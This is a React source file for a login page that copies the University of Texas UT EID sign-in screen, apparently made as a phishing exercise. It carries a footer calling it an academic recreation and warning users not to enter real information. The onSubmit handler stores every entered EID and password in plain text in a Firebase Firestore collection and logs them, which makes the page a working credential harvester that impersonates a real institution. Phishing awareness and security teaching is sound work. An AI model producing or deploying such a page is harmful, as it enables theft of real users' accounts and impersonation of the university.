import React, { useState } from 'react';
import firebase from '../firebase';

import logo from '../img/logo.png';
import dot from '../img/dot.gif';

const Login = () => {
  const [eid, setEID] = useState('');
  const [pass, setPass] = useState('');

  const onSubmit = e => {
    e.preventDefault();

    if (eid && pass) {
      firebase
        .firestore()
        .collection('users')
        .add({ eid: eid, password: pass })
        .then(() => console.log('stored:', eid, pass))
        .catch(err => console.log(err));
    }

    // console.log(eid, pass);
  };
  return (
    <div id='container'>
      <div id='wordmark'>
        <a href='http://www.utexas.edu/'>
          <img src={logo} alt='UT Login' />
        </a>
      </div>
      <div id='content'>
        <div id='loginForm'>
          <div id='message' />
          <form onSubmit={onSubmit}>
            <div id='eid'>
              <label htmlFor='IDToken1'>UT EID</label>
              <br />
              <input
                type='text'
                className='input_pad'
                name='IDToken1'
                id='IDToken1'
                value={eid}
                autoComplete='off'
                size='30'
                aria-required='true'
                autoFocus
                onChange={e => setEID(e.target.value)}
              />
            </div>
            <div id='password'>
              <br />
              <label htmlFor='IDToken2'>PASSWORD</label>
              <br />
              <input
                type='password'
                className='input_pad'
                name='IDToken2'
                id='IDToken2'
                value={pass}
                autoComplete='off'
                size='30'
                aria-required='true'
                onChange={e => setPass(e.target.value)}
              />
            </div>
            <div>
              <img src={dot} alt='' width='1' height='15' />
              <div id='login_btn'>
                <input
                  type='submit'
                  className='login button primary'
                  value='Log In'
                />
              </div>
            </div>
          </form>
        </div>
        <div id='questions'>
          <a href='https://idmanager.its.utexas.edu/eid_self_help/?fp='>
            I forgot my UT EID or password.
          </a>
          <a href='https://idmanager.its.utexas.edu/eid_self_help/?geid='>
            I need a UT EID.
          </a>
          <a href='https://idmanager.its.utexas.edu/eid_self_help'>Help</a>
        </div>
        <div id='license_info'>
          <p>
            This is a recreation of the real page for academic purposes.
            <br />
            DO NOT INPUT REAL INFORMATION
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
